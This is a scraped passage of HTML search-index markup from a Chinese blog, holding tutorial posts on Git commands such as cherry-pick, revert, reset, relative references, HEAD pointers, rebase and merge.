          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;对于多分支的代码库，将代码从一个分支转移到另一个分支是常见需求。&lt;/p&gt;
&lt;p&gt;这时分两种情况。一种情况是，你需要另一个分支的所有代码变动，那么就采用合并（&lt;code&gt;git merge&lt;/code&gt;）。另一种情况是，你只需要部分代码变动（某几个提交），这时可以采用 Cherry pick。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git cherry-pick&lt;/code&gt;命令”复制”一个提交节点并在当前分支做一次完全一样的新提交。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git cherry-pick commitID
git cherry-pick c1
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624778009309.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;h3 id=&#34;一-基本用法&#34;&gt;一、基本用法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;git cherry-pick&lt;/code&gt;命令的作用，就是将指定的提交（commit）应用于其他分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git cherry-pick &amp;lt;commitHash&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面命令就会将指定的提交&lt;code&gt;commitHash&lt;/code&gt;，应用于当前分支。这会在当前分支产生一个新的提交，当然它们的哈希值会不一样。&lt;/p&gt;
&lt;p&gt;举例来说，代码仓库有&lt;code&gt;master&lt;/code&gt;和&lt;code&gt;feature&lt;/code&gt;两个分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;    a - b - c - d   Master
         \
           e - f - g Feature
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;现在将提交&lt;code&gt;f&lt;/code&gt;应用到&lt;code&gt;master&lt;/code&gt;分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 切换到 master 分支
$ git checkout master

# Cherry pick 操作
$ git cherry-pick f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的操作完成以后，代码库就变成了下面的样子。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;    a - b - c - d - f   Master
         \
           e - f - g Feature
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从上面可以看到，&lt;code&gt;master&lt;/code&gt;分支的末尾增加了一个提交&lt;code&gt;f&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;git cherry-pick&lt;/code&gt;命令的参数，不一定是提交的哈希值，分支名也是可以的，表示转移该分支的最新提交。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git cherry-pick feature
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码表示将&lt;code&gt;feature&lt;/code&gt;分支的最近一次提交，转移到当前分支。&lt;/p&gt;
&lt;h3 id=&#34;二-转移多个提交&#34;&gt;二、转移多个提交&lt;/h3&gt;
&lt;p&gt;Cherry pick 支持一次转移多个提交。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git cherry-pick &amp;lt;HashA&amp;gt; &amp;lt;HashB&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的命令将 A 和 B 两个提交应用到当前分支。这会在当前分支生成两个对应的新提交。&lt;/p&gt;
&lt;p&gt;如果想要转移一系列的连续提交，可以使用下面的简便语法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git cherry-pick A..B 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的命令可以转移从 A 到 B 的所有提交。它们必须按照正确的顺序放置：提交 A 必须早于提交 B，否则命令将失败，但不会报错。&lt;/p&gt;
&lt;p&gt;注意，使用上面的命令，提交 A 将不会包含在 Cherry pick 中。如果要包含提交 A，可以使用下面的语法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git cherry-pick A^..B 
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bookstack.cn/read/git-tutorial/docs-commands-git-cherry-pick.md&#34;&gt;网道&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">16-git-12-cherry-pick</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-revert/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git revert&lt;/code&gt;命令用于撤销某个具体的commit。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git revert &amp;lt;commitID&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;撤销上一个commit,之后推送到远程&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git revert HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;实例&#34;&gt;实例&lt;/h2&gt;
&lt;p&gt;当执行完&lt;code&gt;git revert &amp;lt;commitID&amp;gt;&lt;/code&gt;,会出现&lt;code&gt;vim&lt;/code&gt;编辑器页面，按&lt;code&gt;:q&lt;/code&gt;退出编辑，然后提交该commit&lt;/p&gt;
&lt;h2 id=&#34;revert和reset的区别&#34;&gt;revert和reset的区别&lt;/h2&gt;
&lt;p&gt;reset（重置）：将版本回退到某个commit&lt;/p&gt;
&lt;p&gt;恢复（revert）:  回滚某个具体的commit,将它撤销&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624777944096.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
&lt;p&gt;先说一个场景，普通的commit可以直接用revert回滚，假如是一个合并的commit呢&lt;/p&gt;
&lt;p&gt;普通commit&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git revert &amp;lt;commit-id&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;合并commit&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git revert &amp;lt;commit-id&amp;gt; -m
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;-m&#34;&gt;-m&lt;/h3&gt;
&lt;p&gt;当一个commit有两个父节点时，git并不知道你想要回滚它与哪个父节点之间联系，所以需要我们帮git确定保留哪一个。这时需要指定一个 parent number 标识出&amp;quot;主线&amp;quot;，主线的内容将会保留，而另一条分支的内容将被revert。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;即m的意义为指定要保留的父节点。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以下图中为例：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625366627629.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;我们可以看到合并的节点为&lt;code&gt;bd86846&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;git show&lt;/code&gt; 命令可以查看 commit 的详细信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git show bd86846
---
commit bd868465569400a6b9408050643e5949e8f2b8f5
Merge: ba25a9d 1c7036f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Merge: ba25a9d 1c7036f&lt;/code&gt;代表该 merge commit 是从 ba25a9d 和 1c7036f 两个 commit 合并过来的。&lt;/p&gt;
&lt;p&gt;普通的commit是没有merge这一行的。&lt;/p&gt;
&lt;p&gt;从图中可以看出，ba25a9d 代表 master 分支，1c7036f 代表 will-be-revert 分支&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-m&lt;/code&gt; 选项接收的参数是一个数字，数字取值为 1 和 2，也就是 Merge 行里面列出来的第一个还是第二个。&lt;/p&gt;
&lt;p&gt;我们要保留主分支上的内容，所以应该指定为1&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git revert -m 1 bd86846
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;需要注意的地方&#34;&gt;需要注意的地方&lt;/h4&gt;
&lt;p&gt;小明从节点A拉了一条dev分支出来，在节点B中新增了一个文件http.js，并且合并到master分支，合并节点为E。这个时候发现会引起线上bug，赶紧撤回这个合并，新增一个revert节点E’。过了几天小明继续在dev分支上面开发新增了一个文件main.js，并在这个文件中import了http.js里面的逻辑，在dev分支上面一切运行正常。可当他将此时的dev分支合并到master时候却发现，&lt;strong&gt;http.js文件不见了&lt;/strong&gt;，导致main.js里面的逻辑运行报错了。但这次合并并没有任何冲突。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625366673091.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;根据Git的合并策略，在合并两个有分叉的分支（上图中的D、E‘）时，Git 默认会选择Recursive策略。找到D和E’的最短路径共同祖先节点B，以B为base，对D，E‘做三向合并。B中有http.js，D中有http.js和main.js，E’中什么都没有。根据三向合并，B、D中都有http.js且没有变更，E‘删除了http.js，所以合并结果就是没有http.js，没有冲突，所以http.js文件不见了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;即你之前被合并的分支上的提交，都会被丢弃，但是新增的提交，会保留下来。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;解决办法：&lt;/p&gt;
&lt;p&gt;1、revert节点E’之后，此时的dev分支要抛弃删除掉，重新从E’节点拉出分支继续工作，而不是在原dev分支上继续开发节点D；&lt;/p&gt;
&lt;p&gt;2、在节点D合并回E’节点时，先revert一下E’，将之前丢弃的合并提交都找回来，然后再将节点D合并进来。&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000012897697&#34;&gt;segmentfault某作者&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.lzane.com/tech/git-merge/&#34;&gt;李泽帆&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">15-git-11-revert</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-reset/"" data-c="
          &lt;h2 id=&#34;撤销区域&#34;&gt;撤销区域&lt;/h2&gt;
&lt;h3 id=&#34;暂存区&#34;&gt;暂存区&lt;/h3&gt;
&lt;p&gt;撤销已经添加到暂存区中的修改，即让暂存区与最近的提交保持一致，可以使用如下命令，如下三条命令等效&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git reset
git reset HEAD
git reset --mixed HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;撤销上一次向暂存区添加的某个指定文件，不影响工作区中的该文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git reset -- &amp;lt;filename&amp;gt;
git reset -- file1 file2
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;暂存区和工作区&#34;&gt;暂存区和工作区&lt;/h3&gt;
&lt;p&gt;撤销所有暂存区和工作区中的所有变更,回复到上一次提交的状态&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git reset --hard
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;回退到指定的提交&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git reset --hard commitID
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;soft: 不改变工作区和缓存区，只移动 HEAD 到指定 commit。&lt;/li&gt;
&lt;li&gt;mixed: 只改变缓存区，不改变工作区。这是默认参数，通常用于撤销&lt;code&gt;git add&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;hard：改变工作区和暂存区到指定 commit。该参数等同于重置，可能会引起数据损失。&lt;code&gt;git reset --hard&lt;/code&gt;等同于&lt;code&gt;git reset --hard HEAD&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;表示键入交互模式，指定暂存区的哪些部分需要撤销。&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;工作区&lt;/th&gt;
&lt;th&gt;缓存区&lt;/th&gt;
&lt;th&gt;HEAD&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;–soft&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;–mixed&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;–hard&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;// 将当期分支的指针倒退一个 commit，只改变仓库
git reset --soft HEAD~
// 将当期分支的指针倒退一个 commit，改变仓库，并且会改变暂存区
git reset HEAD~
// 将当期分支的指针倒退一个 commit，改变仓库，暂存区，工作区
git reset --hard HEAD~
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624777861958.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624777870293.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">14-git-10-reset</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-xiang-dui-yin-yong/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;通过哈希值指定提交记录很不方便，所以 Git 引入了相对引用。&lt;/p&gt;
&lt;p&gt;使用相对引用的话，你就可以从一个易于记忆的地方（比如bugFix 分支或 HEAD）开始计算。&lt;/p&gt;
&lt;h2 id=&#34;分类&#34;&gt;分类&lt;/h2&gt;
&lt;h3 id=&#34;操作符~&#34;&gt;操作符~&lt;/h3&gt;
&lt;p&gt;HEAD 表示当前分支的最新提交&lt;/p&gt;
&lt;p&gt;HEAD~ 表示当前分支的最新提交的前一个提交（即最新的第二个提交，也就是最新提交的父提交）&lt;/p&gt;
&lt;p&gt;HEAD~~ 表示当前分支的最新提交的前前提交（即最新的第三个提交，也就是最新提交的祖父提交）&lt;/p&gt;
&lt;p&gt;HEAD~~~ 表示当前分支的最新提交的前前前提交（即最新的第四个提交，也就是最新提交的曾祖父提交）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;HEAD~~~等效于HEAD~3&lt;/p&gt;
&lt;p&gt;HEAD~~等效于HEAD~2&lt;/p&gt;
&lt;p&gt;HEAD&lt;sub&gt;等效于HEAD&lt;/sub&gt;1&lt;/p&gt;
&lt;p&gt;HEAD等效于HEAD~0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;操作符&#34;&gt;操作符^&lt;/h3&gt;
&lt;h4 id=&#34;单个直系父提交&#34;&gt;单个直系父提交&lt;/h4&gt;
&lt;p&gt;把这个符号加在引用名称的后面，表示让 Git 寻找指定提交记录的父提交。&lt;/p&gt;
&lt;p&gt;方式一&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main^&lt;/code&gt; 相当于“&lt;code&gt;main&lt;/code&gt; 的父节点”。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main^^&lt;/code&gt; 是 &lt;code&gt;main&lt;/code&gt; 的第二个父节点&lt;/p&gt;
&lt;p&gt;方式二&lt;/p&gt;
&lt;p&gt;我们也可以多次使用 &lt;code&gt;HEAD^&lt;/code&gt; 向上移动。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout HEAD^
git checkout HEAD^
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;多个直系父提交&#34;&gt;多个直系父提交&lt;/h4&gt;
&lt;p&gt;假如当前提交不只一个父节点，有多个直系父提交呢？&lt;/p&gt;
&lt;p&gt;如果一个提交有多个父提交，那么 &lt;code&gt;~&lt;/code&gt; 只会找第一个父提交。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;HEAD^2&lt;/code&gt;来找到第二个父提交&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;
G   H   I   J
 \ /     \ /
  D   E   F
   \  |  / \
    \ | /   |
     \|/    |
      B     C
       \   /
        \ /
         A
 
A =      = A^0
B = A^   = A^1     = A~1
C = A^2
D = A^^  = A^1^1   = A~2
E = B^2  = A^^2
F = B^3  = A^^3
G = A^^^ = A^1^1^1 = A~3
H = D^2  = B^^2    = A^^^2  = A~2^2
I = F^   = B^3^    = A^^3^
J = F^2  = B^3^2   = A^^3^2
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;混合链式调用&#34;&gt;混合链式调用&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout HEAD~^2~2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;选择直系父节点的 第二个父节点的 直系第二个父节点&lt;/p&gt;
&lt;h2 id=&#34;应用&#34;&gt;应用&lt;/h2&gt;
&lt;h3 id=&#34;强制修改分支位置&#34;&gt;强制修改分支位置&lt;/h3&gt;
&lt;p&gt;使用相对引用最多的就是移动分支。可以直接使用 &lt;code&gt;-f&lt;/code&gt; 选项让分支指向另一个提交。例如:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;git branch -f main HEAD~3
git branch -f dev c2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相对引用为我们提供了一种简洁的引用提交记录 的方式， 而 &lt;code&gt;-f&lt;/code&gt; 则容许我们将分支强制移动到那个位置。&lt;/p&gt;
">13-git-9-相对引用</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-referencezhi-zhen/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;所谓指针（reference），只是一个链接，用来指向其他物体，方便引用。Git有三种指针，但是所有指针归根结底都是指向某个commit。&lt;/p&gt;
&lt;h2 id=&#34;分类&#34;&gt;分类&lt;/h2&gt;
&lt;h3 id=&#34;head指针&#34;&gt;HEAD指针&lt;/h3&gt;
&lt;p&gt;头指针：指向目前所在的Branch，用来区分目前在哪个分支。&lt;/p&gt;
&lt;p&gt;查看HEAD 指向&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cat .git/HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果：ref: refs/heads/master&lt;/p&gt;
&lt;p&gt;可以看出HEAD指针指向的是refs/heads/master文件，即master分支&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;如果 HEAD 指向的是一个引用,可以通过以下命令查看它的指向&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git symbolic-ref HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;branch指针&#34;&gt;Branch指针&lt;/h3&gt;
&lt;p&gt;分支指针：指向某个commit。每次该分支有新的commit，指针就会变动，指向当前分支的最新提交。&lt;/p&gt;
&lt;p&gt;当我们从master新建一个test分支时，git只会创建一个test分支指针，并且让test分支指针指向master分支对应的最新的提交。&lt;/p&gt;
&lt;p&gt;查看master分支文件的内容&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cat .git/refs/heads/master
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到，这个文件的内容是一串哈希码，而这个哈希码正是master分支上最新的提交所对应的哈希码。&lt;/p&gt;
&lt;h2 id=&#34;分离头&#34;&gt;分离头&lt;/h2&gt;
&lt;p&gt;通常情况下，HEAD指针总是通过分支指针，间接的指向了当前分支的最新提交。&lt;/p&gt;
&lt;p&gt;不通常的情况便是分离头（detached HEAD）：就是头指针和分支指针分开了，HEAD指针没有指向分支指针，而是直接指向了某个提交。&lt;/p&gt;
&lt;p&gt;我们随便检出到某个提交，都可以进入分离头状态&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git checkout cbd3348
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;分离头的应用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于刚才我们直接检出了’cbd3348’这个提交，所以，我们处于分离头状态，而且当前仓库中各个文件的内容也回到了’cbd3348’这个提交对应的状态。此时创建了两个新提交，这两个新提交与分叉点之前的提交组成了一条匿名分支，没有任何一个分支标签指向这个匿名分支。我们现在有两个选择，如下：&lt;/p&gt;
&lt;p&gt;选择一：丢弃这个匿名分支&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;直接检出到任何一个别的分支，就相当于放弃了这些提交&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;选择二：保留这个匿名分支&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;只需要将这些提交创建成一条新的分支就行了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git checkout -b newtest
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch newtest dca15df
&lt;/code&gt;&lt;/pre&gt;
">12-git-8-reference(指针)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-rebase/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;将当前分支移植到指定分支或指定commit之上。&lt;/p&gt;
&lt;p&gt;Rebase 实际上就是取出一系列的提交记录，“复制”它们，然后在另外一个地方逐个的放下去。&lt;/p&gt;
&lt;p&gt;Rebase 的优势就是可以创造更线性的提交历史，这听上去有些难以理解。如果只允许使用 Rebase 的话，代码库的提交历史将会变得异常清晰。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rebase master
git rebase c2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将当前分支移植到master分支或c2提交记录之上。&lt;/p&gt;
&lt;p&gt;优点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rebase 使你的提交树变得很干净, 所有的提交都在一条线上&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;缺点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rebase 修改了提交树的历史&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624777673513.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;交互式&#34;&gt;交互式&lt;/h2&gt;
&lt;h3 id=&#34;-iinteractive&#34;&gt;-i，—interactive&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;-i&lt;/code&gt;参数会打开互动模式，让用户选择定制&lt;code&gt;rebase&lt;/code&gt;的行为。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git rebase -i HEAD~4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上述命令指定了对当前分支的最近四次提交进行操作&lt;/p&gt;
&lt;h3 id=&#34;功能&#34;&gt;功能&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;调整提交记录的顺序（通过鼠标拖放来完成）&lt;/li&gt;
&lt;li&gt;删除你不想要的提交（通过切换 &lt;code&gt;pick&lt;/code&gt; 的状态来完成，关闭就意味着你不想要这个提交记录）&lt;/li&gt;
&lt;li&gt;合并提交。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;多次rebase&#34;&gt;多次rebase&lt;/h2&gt;
&lt;p&gt;当你想将多个分支合成一条线性的提交记录时，按照提交顺序切换相应的分支，然后rebase到相应顺序节点的分支&lt;/p&gt;
&lt;h2 id=&#34;git-merge-和-git-rebase-的区别&#34;&gt;git merge 和 git rebase 的区别&lt;/h2&gt;
&lt;p&gt;不同于 &lt;code&gt;git rebase&lt;/code&gt; 的是，&lt;code&gt;git merge&lt;/code&gt; 在不是 fast-forward（快速合并）的情况下，会产生一条额外的合并记录，类似 &lt;code&gt;Merge branch &#39;xxx&#39; into &#39;xxx&#39;&lt;/code&gt; 的一条提交信息。&lt;/p&gt;
&lt;p&gt;另外，在解决冲突的时候，用 merge 只需要解决一次冲突即可，简单粗暴，而用 rebase 的时候 ，需要依次解决每次的冲突，才可以提交。&lt;/p&gt;
&lt;p&gt;git merge&lt;br&gt;
&lt;img src=&#34;https://leecss.com/post-images/1624678535981.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;git rebase&lt;br&gt;
&lt;img src=&#34;https://leecss.com/post-images/1624678567467.webp&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用情况&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当需要保留详细的合并信息的时候建议使用&lt;code&gt;git merge&lt;/code&gt;，特别是需要将分支合并进入&lt;code&gt;master&lt;/code&gt;分支时；&lt;/p&gt;
&lt;p&gt;当发现自己修改某个功能时，频繁进行了&lt;code&gt;git commit&lt;/code&gt;提交时，发现其实过多的提交信息没有必要时，可以尝试&lt;code&gt;git rebase&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;一些开发人员喜欢保留提交历史，因此更偏爱 merge。而其他人（比如我自己）可能更喜欢干净的提交树，于是偏爱 rebase。仁者见仁，智者见智。&lt;/p&gt;
">11-git-7-rebase</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-merge/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git merge&lt;/code&gt;命令用于合并指定分支到当前分支&lt;/p&gt;
&lt;p&gt;将develop分支合并到当前分支，当前分支会创建新的commit对象，它有两个父节点，分别指向当前分支和develop分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git merge develop
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;合并方式&#34;&gt;合并方式&lt;/h2&gt;
&lt;h3 id=&#34;非快进方式&#34;&gt;非快进方式&lt;/h3&gt;
&lt;p&gt;假如此时在C1节点master分支上，创建了一个新的分支dev,然后在master分支创建新的提交C2,在dev分支上创建新的提交C3。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果合并分支之前，master分支和dev分支都有了属于自己分支的独有提交，此时只能使用普通方式进行合并。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;此时可以将master合并到dev,也可以将dev合并到master&lt;/p&gt;
&lt;p&gt;以dev合并到master为例：&lt;/p&gt;
&lt;p&gt;在maser分支执行&lt;code&gt;git merge dev&lt;/code&gt;，会有新的变更进入到master，新变更进入后，master分支的内容会产生变化，因此master分支需要一个新的提交来对应变化后的状态，于是，master分支的指针会指向最新产生的合并提交。&lt;/p&gt;
&lt;p&gt;而对于dev分支来说，并没有任何内容发生变动，所以dev分支的指针仍然保持原位。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1624777430550.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;fast-forward快进&#34;&gt;fast-forward（快进）&lt;/h3&gt;
&lt;p&gt;假如此时在C1节点master分支上，创建了一个新的分支dev,然后在dev分支上创建新的提交C2。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果合并分支之前，master分支和dev分支中只有一个分支创建了属于自己分支的独有提交，此时可以使用fast-forward进行合并。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于基于maste分支创建dev分支以后，master分支中并没有产生任何新的提交，如果此时想要将dev分支合并到master分支，只需要将master分支的指针指向到dev分支的最新提交，即可让master分支包含dev分支中的所有新变更。即：&lt;/p&gt;
&lt;p&gt;&lt;u&gt;如果“指定分支”本身是当前分支的一个直接子节点，则会产生fast-forward合并，即合并不会产生新的节点，只是让当前分支指向“指定分支”的最新commit。&lt;/u&gt;&lt;/p&gt;
